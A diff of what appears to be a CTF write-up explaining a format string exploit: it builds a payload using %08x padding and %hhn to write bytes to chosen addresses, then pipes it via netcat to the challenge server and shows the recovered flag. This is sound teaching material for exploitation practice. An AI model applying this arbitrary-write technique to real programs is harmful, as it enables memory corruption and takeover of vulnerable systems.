@@ -99,9 +99,9 @@ This takes up 8 bytes.
 
 The string is located at an offset of 12 bytes \(3 dwords\) from the pointer to itself \(See above\).  
 To reach the start of the string on the stack we need to consume these 3 dwords.  
-The format string that can be used is` %08x%08x%08x`
+The format string that can be used is`%08x%08x%08x`
 
-The exploit string generated till this point is 
+The exploit string generated till this point is
 
 ```
 \x1d\xa0\x04\x08\x1c\xa0\x04\x08%08x%08x%08x
@@ -121,7 +121,31 @@ Alternatively, we can make the last `%08x` to display 109 bytes using space padd
 \x1d\xa0\x04\x08\x1c\xa0\x04\x08%08x%08x%109x
 ```
 
+Number of bytes displayed till now is 133. We can use the [format specifier](http://www.cplusplus.com/reference/cstdio/printf/) `%hhn` to write this value at the address specified. The address is a pointer to a variable and usually passed as an argument to printf. Here we have provided the address \(`0804A01D`\) at the beginning of the string itself.
 
+```
+\x1d\xa0\x04\x08\x1c\xa0\x04\x08%08x%08x%109x%hhn
+```
+
+`hh` is the length sub-specifier and it indicates to write a byte value i.e. the address is a pointer to a byte. If the value to write is larger than a byte, it would be automatically **wrapped**. The situation is similar for other length sub-specifiers such as `h`, `l` and `ll`. Without any length sub-specifier it defaults to `int`.
+
+Now, at this point, we have written `0x85` \(133\) to the location `0804A01D`. In this process we have also displayed 133 bytes on the terminal. 
+
+The next task is to write `0xAB` \(171\) to the location `0804A01C` and for that we need to display `171 - 133 = 38` more bytes. These bytes can again be simply appended to the exploit string. Using this approach our final exploit string would be:
+
+```
+\x1d\xa0\x04\x08\x1c\xa0\x04\x08%08x%08x%109x%hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%hhn
+```
+
+```bash
+$ python -c "print '\x1d\xa0\x04\x08\x1c\xa0\x04\x08%08x%08x%109x%hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%hhn'" > exploit
+$ nc pwn.ctf.tamu.edu 4323 < exploit
+Enter a word to be echoed:
+��0000000200000000                                                                                                            0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAThis function has been deprecated
+gigem{F0RM@1NG_1S_H4RD}
+
+
+```
 
 ## Using pwntools \(automated\)
 
